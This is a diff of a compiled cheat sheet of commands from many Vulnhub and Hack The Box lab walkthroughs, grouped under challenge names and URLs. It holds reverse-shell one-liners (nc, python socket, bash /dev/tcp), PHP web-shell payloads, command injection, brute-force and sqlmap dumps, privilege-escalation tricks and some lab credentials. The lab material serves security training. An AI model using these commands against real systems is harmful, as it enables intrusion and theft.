 Challenge URL: https://www.hackingarticles.in/sunset-twilight-vulnhub-walkthrough/
+
 netdiscover -i ethX
 nmap -A –p- 192.168.10.177
 http://192.168.10.177/gallery/original/shell2.php
 
 
 
+
+Challenge Name: Presidential 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/presidential-1-vulnhub-walkthrough/
+
 netdiscover -i ethX
 nmap -A -p- 192.168.10.172
 
 
 
+
+Challenge Name: Greenoptic 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/greenoptic-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A -p- 192.168.10.160
 
 
 
+
+Challenge Name: Blackrose 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/blackrose-1-vulnhub-walkthrough/
+
 nmap -A –p- 192.168.1.21
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.22 1234 >/tmp/f
 sudo -u delx /bin/ld.so /bin.sh
 
 
 
+
+Challenge Name: Cybersploit 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/cybersploit-1-vulnhub-walkthrough/
+
 netdiscover
 nmap –sV -sC -p- 192.168.10.190
 
 
 
+
+Challenge Name: Sunset Decoy Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/sunset-decoy-vulnhub-walkthrough/
+
 nmap –sV -sC -p- 192.168.10.186
 
 
 
+
+Challenge Name: Tre1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/tre1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.104
 dirb http://192.168.1.104/ /usr/share/wordlists/dirb/big.txt -X .html,.php,.txt
@@ -2793,19 +3097,28 @@ cat root.txt
 
 
 
+
+Challenge Name: Gitroot 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/gitroot-1-vulnhub-walkthrough/
+
 nmap -A -p- 192.168.10.162
 ./gitdumper.sh http://repo.gitroot.vuln/.git/ /root/GitRoot/git-tmp/
 
 
 
+
+Challenge Name: Glasgow Smile 1 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/glasgow-smile-1-1-vulnhub-walkthrough/
+
 nmap -A -p- 192.168.10.162
 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.155",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 
 
 
+
+Challenge Name: Ha Pandavas Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-pandavas-vulnhub-walkthrough/
+
 nmap -sV -p- 192.168.10.162
 snmpwalk -v1 -c public 192.168.10.162 |more
 mysqldump -A –u root –password=ignite@123 |grep flag
@@ -2814,18 +3127,27 @@ sudo -u root bash -i >& /dev/tcp/192.168.10.161/4444 0>&1
 
 
 
+
+Challenge Name: Hack The Box Monteverde Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-monteverde-walkthrough/
+
 nmap -sV --top-ports 5000 10.10.10.172
 
 
 
+
+Challenge Name: Ha Natraj Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-natraj-vulnhub-walkthrough/
+
 netdiscover
 nmap -sV -sC -p- 192.168.10.156
 
 
 
+
+Challenge Name: Seppuku1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/seppuku1-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.1.104
 http://192.168.1.104:7601
 dirb http://192.168.1.104:7601
@@ -2855,7 +3177,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Lemonsqueezy1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/lemonsqueezy1-vulnhub-walkthrough/
+
 nmap -A 192.168.1.105
 http://192.168.1.105
 dirb http://192.168.1.105
@@ -2886,7 +3211,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Victim1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/victim1-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.1.104
 aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap
 ssh dlink@192.168.1.104
@@ -2911,7 +3239,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Sumo 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/sumo-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.1.104
 nikto -h http://192.168.1.104
@@ -2933,7 +3264,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Zion 1 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/zion-1-1-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.1.109
 cewl http://192.168.1.109/ -w dict.txt
 Username: morpheus.thematrix
@@ -2947,7 +3281,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Devrandom Ctf1 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/devrandom-ctf1-1-vulnhub-walkthrough/
+
 nmap -A -p- 192.168.1.105
 192.168.1.105/robots.txt
 192.168.1.105/?include=info
@@ -2969,7 +3306,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Mhz_Cxf C1F Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/mhz_cxf-c1f-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.1.104
 dirb http://192.168.1.104/ -X .txt
 http://192.168.1.104/notes.txt
@@ -2998,7 +3338,10 @@ cat .root.txt
 
 
 
+
+Challenge Name: Cengbox 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/cengbox-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.1.106
 dirb http://192.168.1.106/ /usr/share/wordlists/big.txt
@@ -3026,7 +3369,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Tbbt2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/tbbt2-vulnhub-walkthrough/
+
 netdiscover
 nmap -sV 192.168.1.105
 dirb http://192.168.1.105/ -X .txt
@@ -3053,7 +3399,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Katana Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/katana-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.1.11
 dirb http://192.168.1.119:8088/ -X .html
@@ -3062,7 +3411,10 @@ getcap -r / 2>/dev/null
 
 
 
+
+Challenge Name: Geisha1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/geisha1-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.1.133
 hydra -l geisha -P /usr/share/wordlists/rockyou.txt 192.168.1.133 ssh
@@ -3077,7 +3429,10 @@ base32 "/root/flag.txt" | base32 --decode
 
 
 
+
+Challenge Name: Hack The Box Open Admin Box Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-open-admin-box-walkthrough/
+
 nmap -sV -Pn 10.10.10.171
 dirb http://10.10.10.171/
 http://10.10.10.171/music
@@ -3096,7 +3451,10 @@ reset; sh 1>&0 2>&0
 
 
 
+
+Challenge Name: Vulnuni 1 0 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/vulnuni-1-0-1-vulnhub-walkthrough/
+
 nmap -A 192.168.1.148
 sqlmap -r vulnuni --dbs --batch
 sqlmap -r vulnuni -D eclass -T user -C password --dump --batch
@@ -3124,7 +3482,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Hack The Box Wall Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-wall-walkthrough/
+
 nmap -A 10.10.10.157
 http://10.10.10.157
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.157 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad Credentials" -V
@@ -3153,7 +3514,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Tbbt Funwithflags Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/tbbt-funwithflags-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.1.105
 FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}
 dirb http://192.168.1.105
@@ -3227,7 +3591,10 @@ cat /root/marsroversketch.jpg.out
 
 
 
+
+Challenge Name: Hack The Box Postman Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-postman-walkthrough/
+
 nmap -p- 10.10.10.160
 redis -cli -h 10.10.10.160
 config get dir
@@ -3255,7 +3622,10 @@ cat /home/Matt/user.txt
 
 
 
+
+Challenge Name: Muzzybox 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/muzzybox-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.6
 http://192.168.1.6
@@ -3298,7 +3668,10 @@ Flag #3: N$CtF{8!NG000!!!__Y0U_D!D_!T_80!!!}
 
 
 
+
+Challenge Name: Sahu Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/sahu-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.1.105
 ftp 192.168.1.105
@@ -3319,7 +3692,10 @@ openssl passwd -1 -salt raj pass123
 
 
 
+
+Challenge Name: 2Much 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/2much-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -sV -p- 192.168.0.109
 http://192.168.0.109
@@ -3355,7 +3731,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Inclusiveness 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/inclusiveness-1-vulnhub-walkthrough/
+
 nmap -p- -A 192168.29.151
 ftp 192.168.29.151
 cd /pub
@@ -3378,7 +3757,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: My File Server 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/my-file-server-1-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.29.123
 smbmap -H 192.168.29.123
 wget http://192.168.29.208:8000/40616.c
@@ -3387,7 +3769,10 @@ gcc 40616.c -o raj -pthread
 
 
 
+
+Challenge Name: Sar Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/sar-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.29.212
 dirb http://192.168.29.212
 http://192.168.29.212/sar2html/index.php?plot=; tail "/etc/passwd"
@@ -3403,7 +3788,10 @@ cat write.sh
 
 
 
+
+Challenge Name: Hack The Box Haystack Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-haystack-walkthrough/
+
 nmap -A 10.10.10.115
 strings needle.jpg
 echo "bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==" |base64 -d
@@ -3422,7 +3810,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Networked Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-networked-walkthrough/
+
 nmap -A 10.10.10.146
 http://10.10.10.146
 exiftool -Comment='<?php system("nc 10.10.14.15 1234 -e /bin/bash"); ?>' 1.png
@@ -3434,7 +3825,10 @@ nc -lvp 8888
 
 
 
+
+Challenge Name: Tempus Fugit 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/tempus-fugit-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.43.100
 http://192.168.43.100
@@ -3511,7 +3905,10 @@ ls
 
 
 
+
+Challenge Name: Hack The Box Writeup Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-writeup-walkthrough/
+
 nmap -A 10.10.10.138
 http://10.10.10.138/writeup
 python 46635.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlists/rockyou.txt
@@ -3537,7 +3934,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Enubox Mattermost Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/enubox-mattermost-vulnhub-walkthrough/
+
 netdiscover
 nmap -sT -sU -A 192.168.0.110
 http://192.168.0.110
@@ -3576,7 +3976,10 @@ cat local.txt
 
 
 
+
+Challenge Name: View2Akill Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/view2akill-vulnhub-walkthrough/
+
 python -c 'import pty;pty.spawn("/bin/bash")'
 sha1(lower_alpha+”view”+digit+digit)
 mp64 ?lview?d?d > fuzz.txt
@@ -3584,7 +3987,10 @@ python fuzzing.py > new_fuzz.txt
 
 
 
+
+Challenge Name: Hack The Box Jarvis Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-jarvis-walkthrough/
+
 sqlmap –u http://10.10.10.143/room.php?cod=1 --dbs --batch
 sqlmap –u http://10.10.1.0.143/room.php?cod=1 --dbs --os-shell --batch
 shell
@@ -3614,7 +4020,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Bitlab Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-bitlab-walkthrough/
+
 nmap -A -p- 10.10.10.114
 http://10.10.10.114/help/
 <?php
@@ -3639,7 +4048,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Five86 2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/five86-2-vulnhub-walkthrough/
+
 nmap -A 192.168.0.114
 http://192.168.0.114
 wpscan --url http://192.168.0.114 --enumerate u
@@ -3669,7 +4081,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Five861 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/five861-vulnhub-walkthrough/
+
 http://192.168.0.126/ona
 use exploit 47772
 set rhosts 192.168.0.126
@@ -3692,7 +4107,10 @@ cd .game
 
 
 
+
+Challenge Name: Symfonos5 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/symfonos5-vulnhub-walkthrough/
+
 nmap -A 192.168.0.112
 dirb http://192.168.0.112
 nmap 192.168.0.112 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"'
@@ -3714,7 +4132,10 @@ cat proof.txt
 
 
 
+
+Challenge Name: Cynix1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/cynix1-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.1.105
 chmod 600 key
 ssh -i key ford@192.168.1.105
@@ -3738,7 +4159,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Dc 9 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/dc-9-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.8
 sqlmap -r raj.txt --dbs --batch
@@ -3765,7 +4189,10 @@ su pavan
 
 
 
+
+Challenge Name: Hack The Box Heist Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-heist-walkthrough/
+
 nmap -sC -sV -p- 10.10.10.149
 http://ibeast.com/tools/CiscoPassword
 rout3r: $uperP@ssword
@@ -3792,7 +4219,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Sunset Dusk Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/sunset-dusk-vulnhub-walkthrough/
+
 nmap -A 192.168.1.167
 hydra -l root -P /usr/share/wordlists/rockyou.txt  192.168.1.167 mysql
 select "<?php system($_GET['cmd']); ?>" into outfile '/var/tmp/raj.php' ;
@@ -3804,7 +4234,10 @@ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
 
 
 
+
+Challenge Name: Sunset Sunrise Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/sunset-sunrise-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.197
 http://192.168.1.197:8080
@@ -3833,7 +4266,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Sunset Dawn Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/sunset-dawn-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.165
 dirb http://192.168.1.165/
@@ -3860,7 +4296,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Sunset Nightfall Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/sunset-nightfall-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.0.24
 enum4linux 192.168.0.24
@@ -3874,7 +4313,10 @@ sudo -u root cat /etc/shadow
 
 
 
+
+Challenge Name: Sunset Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/sunset-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.153
 ftp 192.168.1.153
@@ -3892,7 +4334,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Me And My Girlfreind1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/me-and-my-girlfreind1-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.29.148
 Username: alice
 Password: 4lic3
@@ -3905,7 +4350,10 @@ cat flag2.txt
 
 
 
+
+Challenge Name: Ua Literally Vulnerable Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ua-literally-vulnerable-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.1.103
 ftp 192.168.1.103
@@ -3973,7 +4421,10 @@ cat root.txt
 
 
 
+
+Challenge Name: In Plain Sight1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/in-plain-sight1-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- 192.168.43.8
 ftp 192.168.43.8
@@ -4001,7 +4452,10 @@ john cracker -wordlist=/usr/share/wordlists/rockyou.txt
 
 
 
+
+Challenge Name: Ha Dhanush Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-dhanush-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.1.101
 cewl http://192.168.1.101/ -w dict.txt
@@ -4031,7 +4485,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Ha Chanakya Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-chanakya-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.101
 http://192.168.1.101
@@ -4073,7 +4530,10 @@ cat final.txt
 
 
 
+
+Challenge Name: Djinn1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/djinn1-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- 192.168.43.134
 ftp 192.168.43.134
@@ -4133,7 +4593,10 @@ ls
 
 
 
+
+Challenge Name: Jigsaw1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/jigsaw1-vulnhub-walkthrough/
+
 arp-scan --localnet --ignoredups
 tcpdump -A -n host 192.168.138.100 and arp
 tcpdump -A -n host 192.168.138.100 and not arp
@@ -4187,7 +4650,10 @@ python xpl.py
 
 
 
+
+Challenge Name: Evm 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/evm-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.103
 dirb http://192.168.1.103/
@@ -4211,7 +4677,10 @@ willy26
 
 
 
+
+Challenge Name: Mumbai1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/mumbai1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A -p- 192.168.1.221
 ftp 192.168.1.221
@@ -4245,7 +4714,10 @@ cat proof.txt
 
 
 
+
+Challenge Name: Gears Of War Ep1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/gears-of-war-ep1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A -p- 192.168.1.184
 smbclient -L 192.168.1.184
@@ -4275,7 +4747,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Ha Chakravyuh Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-chakravyuh-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.1.105
 http://192.168.1.105
@@ -4312,7 +4787,10 @@ cat final.txt
 
 
 
+
+Challenge Name: Ha Rudra Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-rudra-vulnhub-walkthrough/
+
 192.168.1.101
 nmap -A 192.168.1.101
 showmount -e 192.168.1.101
@@ -4340,7 +4818,10 @@ cat final.txt
 
 
 
+
+Challenge Name: Ha Avengers Arsenal Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-avengers-arsenal-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.101
 http://192.168.1.101
@@ -4391,7 +4872,10 @@ cp yaka.xlsx /var/www/html/
 
 
 
+
+Challenge Name: Ha Naruto Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-naruto-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.0.4
 smbclient -L \\192.168.0.4
@@ -4416,7 +4900,10 @@ cat final.txt
 
 
 
+
+Challenge Name: Ha Joker Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-joker-vulnhub-walkthrough/
+
 nmap -A 192.168.1.101
 http://192.168.1.101
 http://192.168.1.101:8080
@@ -4447,7 +4934,10 @@ cat final.txt
 
 
 
+
+Challenge Name: Ha Isro Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-isro-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.104
 http://192.168.1.104
@@ -4483,7 +4973,10 @@ cat final.txt
 
 
 
+
+Challenge Name: Ha Infinity Stones Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-infinity-stones-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.0.4
 exiftool space.jpg
@@ -4512,7 +5005,10 @@ cat final.txt
 
 
 
+
+Challenge Name: Ha Wordy Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ha-wordy-vulnhub-walkthrough/
+
 nmap -A 192.168.0.27
 dirb http://192.168.0.27/
 wpscan --url http://192.168.0.27/wordpress --enumerate p
@@ -4576,7 +5072,10 @@ exploit
 
 
 
+
+Challenge Name: Hacker Fest 2019 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/hacker-fest-2019-vulnhub-walkthrough/
+
 nmap -A 192.168.0.20
 wpscan --url http://192.168.0.20/
 msf5 > use auxiliary/admin/http/wp google_maps_sqli
@@ -4601,7 +5100,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Bossplayersctf 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/bossplayersctf-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.107
 drib http://192.168.1.107/
@@ -4624,7 +5126,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Misdirection 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/misdirection-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.106
 dirb http://192.168.1.106:8080/
@@ -4651,7 +5156,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Hack The Box Challenge Bastion Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-challenge-bastion-walkthrough/
+
 nmap -A 10.10.10.134
 smbclient -L //10.10.10.134
 smbclient //10.10.10.134/Backups
@@ -4692,7 +5200,10 @@ administrator@BASTION C:\Users\Administrator\Desktop>type root.txt
 
 
 
+
+Challenge Name: Hack The Box Luke Walkthrough
 Challenge URL: https://www.hackingarticles.in/hack-the-box-luke-walkthrough/
+
 nmap -A 10.10.10.137
 ftp 10.10.10.137
 ftp> ls
@@ -4708,7 +5219,10 @@ curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c
 
 
 
+
+Challenge Name: Silky Ctf 0X01 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/silky-ctf-0x01-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.106
 crunch 7 7 -t s1lky^% >> pass.txt
@@ -4726,7 +5240,10 @@ flag.txt
 
 
 
+
+Challenge Name: Prime 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/prime-1-vulnhub-walkthrough/
+
 nmap -A 192.168.1.101
 dirb http://192.168.1.101
 dirb http://192.168.1.101/ -X .txt
@@ -4742,7 +5259,10 @@ msf exploit(exploit/linux/local/bpf_sign_extension_priv_esc) > exploit
 
 
 
+
+Challenge Name: Ai Web 2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ai-web-2-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.0.3
 dirb http://192.168.0.3/
@@ -4779,7 +5299,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Ai Web 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ai-web-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.13.131
 dirb http://192.168.13.131/m3diNf0/
@@ -4822,7 +5345,10 @@ meterpreter > sysinfo
 
 
 
+
+Challenge Name: Serial 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/serial-1-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.2.6
 dirb http://192.168.2.6
 echo base64_encode(serialize(new User('admin')));
@@ -4842,7 +5368,10 @@ cat fl4g.txt
 
 
 
+
+Challenge Name: Westwild 2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/westwild-2-vulnhub-walkthrough/
+
 nmap -A 192.168.1.105
 dirb http://192.168.1.105
 wget http://192.168.1.105/admin/aspadmin/user.list
@@ -4872,7 +5401,10 @@ su raj
 
 
 
+
+Challenge Name: Grimtheripper 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/grimtheripper-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.0.8
 dirb http://192.168.0.8/
@@ -4899,7 +5431,10 @@ id
 
 
 
+
+Challenge Name: Nezuko 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/nezuko-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -p- -A 192.168.1.105
 searchsploit Webmin 1.920
@@ -4932,7 +5467,10 @@ cat root.txt
 
 
 
+
+Challenge Name: Broken Gallery Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/broken-gallery-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.107
 hydra -L user -P pwd 192.168.1.107 ssh
@@ -4941,7 +5479,10 @@ sudo /sbin/reboot
 
 
 
+
+Challenge Name: Dpwwn2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/dpwwn2-vulnhub-walkthrough/
+
 nmap –A 10.10.10.10
 dirb http://10.10.10.10/
 wpscan --url http://10.10.10.10/wordpress -e p
@@ -4973,7 +5514,10 @@ cat dpwwn-02-FLAG.txt
 
 
 
+
+Challenge Name: Dpwwn 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/dpwwn-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.101
 mysql –h 192.168.1.101 –u root –p
@@ -4994,7 +5538,10 @@ cat dpwwn-01—FLAG.txt
 
 
 
+
+Challenge Name: The Library2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/the-library2-vulnhub-walkthrough/
+
 nmap -A 192.168.1.107
 dirb http://192.168.1.107 -X .php
 sqlmap -r sql --dbs --batch --risk 3 --level 5
@@ -5017,7 +5564,10 @@ id
 
 
 
+
+Challenge Name: The Library1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/the-library1-vulnhub-walkthrough/
+
 nmap -A 192.168.1.103
 dirb http://192.168.1.103 -X .php
 sqlmap -r file.txt --dbs –batch --risk 3 --level 5
@@ -5036,7 +5586,10 @@ id
 
 
 
+
+Challenge Name: Tr0Ll 3 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/tr0ll-3-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.104
 start:here
@@ -5092,7 +5645,10 @@ cat flag.txt
 
 
 
+
+Challenge Name: Clamp 1 0 1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/clamp-1-0-1-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.101
 sqlmap -u http://192.168.1.101/nt4stopc/011011101/sumertimesummertime/go.php?id=1 --dbs --batch
@@ -5103,7 +5659,10 @@ ssh mkelepc@192.168.1.101
 
 
 
+
+Challenge Name: Digitalworld Localtorment Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/digitalworld-localtorment-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.1.105
 ftp 192.168.1.105
@@ -5146,7 +5705,10 @@ cat author-secret.txt
 
 
 
+
+Challenge Name: Ted1 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/ted1-vulnhub-walkthrough/
+
 nmap -p- -A 192.168.1.10
 /var/lib/php/sessions/sess_<php session id>
 <?php system("ifconfig")?>
@@ -5158,7 +5720,10 @@ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 
 
 
+
+Challenge Name: Symfonos4 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/symfonos4-vulnhub-walkthrough/
+
 netdiscover
 nmap -A 192.168.0.23
 dirb http://192.168.0.23/ /usr/share/wordlists/dirb/big.txt -X .php
@@ -5182,7 +5747,10 @@ cat proof.txt
 
 
 
+
+Challenge Name: Symfonos3 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/symfonos3-vulnhub-walkthrough/
+
 nmap -A 192.168.1.103
 dirb http://192.168.1.103
 use exploit/multi/http/apache_mod_cgi_bash_enc_exec
@@ -5216,7 +5784,10 @@ cat proof.txt
 
 
 
+
+Challenge Name: Symfonos2 Vulnhub Walkthrough
 Challenge URL: https://www.hackingarticles.in/symfonos2-vulnhub-walkthrough/
+
 nmap –A 192.168.1.102
 smbclient –L 192.168.1.102
 smbclient //192.168.1.102/anonymous
